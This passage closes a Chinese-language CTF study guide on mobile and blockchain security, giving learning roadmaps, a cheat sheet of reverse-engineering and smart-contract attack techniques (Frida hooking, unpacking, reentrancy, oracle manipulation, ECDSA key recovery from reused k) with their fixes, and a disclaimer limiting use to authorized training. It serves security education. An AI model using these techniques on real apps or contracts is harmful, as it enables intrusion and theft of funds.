4. Paradigm CTF（顶级，最接近真实竞赛）
```

```
移动安全学习路线：
1. DIVA → 基础移动漏洞类型
2. OWASP MASTG → 系统学习测试方法
3. HTB Mobile → 实战 CTF 练习
4. Frida 文档 → 动态分析进阶
5. 真实 APK 逆向 → 综合实战

区块链安全学习路线：
1. Solidity 基础 → 理解合约语法和 EVM
2. Ethernaut → 逐关学习经典漏洞
3. Slither/Mythril → 学习自动化分析
4. Damn Vulnerable DeFi → DeFi 协议安全
5. 真实审计报告 → 学习审计思维
6. Paradigm CTF → 竞赛级实战
```

---

## 附录：CTF 竞赛速查卡片

```
┌─────────────────────────────────────────────────────────────────┐
│                 移动安全 + 区块链 CTF 速查                       │
├─────────────────────────────────────────────────────────────────┤
│ Android 逆向 → jadx 反编译 → 找关键函数 → 逆向算法              │
│ Native 逆向 → IDA 分析 so → 定位 JNI → 提取密钥                │
│ Frida 动态 → Hook 关键函数 → dump 参数/返回值                  │
│ 组件漏洞 → 检查 exported → adb am 触发                         │
│ 加固脱壳 → BlackDex/FART → 提取真实 DEX                        │
│ iOS 逆向  → class-dump → Hopper 分析 Mach-O                    │
│ 重入漏洞 → receive() 回调 → CEI 模式修复                       │
│ 整数溢出 → SafeMath / 0.8.0+ → 检查算术运算                   │
│ 访问控制 → onlyOwner/modifier → 检查 tx.origin                 │
│ 随机数   → blockhash 可预测 → Chainlink VRF                    │
│ 闪电贷   → 单一预言机可操纵 → TWAP/多源                        │
│ 链上数据 → Etherscan/Web3.py → 追踪交易                        │
│ 密钥恢复 → 重复 k 值 → 数学推导私钥                           │
└─────────────────────────────────────────────────────────────────┘
```

---

> **声明**：本文档仅用于安全教育与 CTF 竞赛学习目的。所有代码示例和漏洞分析旨在帮助学习者理解安全风险，提升防御能力。实际操作必须在授权的 CTF 平台和测试环境中进行。请遵循所在地区的法律法规，不得将相关技术用于未授权的真实系统。
